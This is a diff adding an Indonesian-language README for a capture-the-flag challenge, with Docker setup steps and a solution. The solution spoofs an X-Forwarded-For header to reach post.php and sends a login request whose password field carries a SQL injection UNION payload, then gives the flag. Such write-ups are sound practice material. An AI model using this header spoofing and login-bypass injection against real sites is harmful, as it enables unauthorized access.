@@ -1,0 +1,26 @@
+# Untuk Menjalankan CTF:
+`sudo apt install docker-compose`  
+Ganti port pada docker-compose.yml sesuai yang dibutuhkan.  
+Jalankan: `docker-compose up`
+
+# Solve
+Menuju /post.php  
+
+Tambahkan `X-Forwarded-For: 192.168.100.11` untuk mengakses post.php.  
+
+Buat request di bawah ini:
+
+```
+POST /login.php HTTP/1.1
+Host: localhost:55043
+X-Forwarded-For: 172.16.2.24
+
+...
+
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+
+email=admin&pass=admin' UNION SELECT 'admin', 'admin';#
+```
+
+Flag: FindITCTF{NO_3ntries_N0_w0rr135}
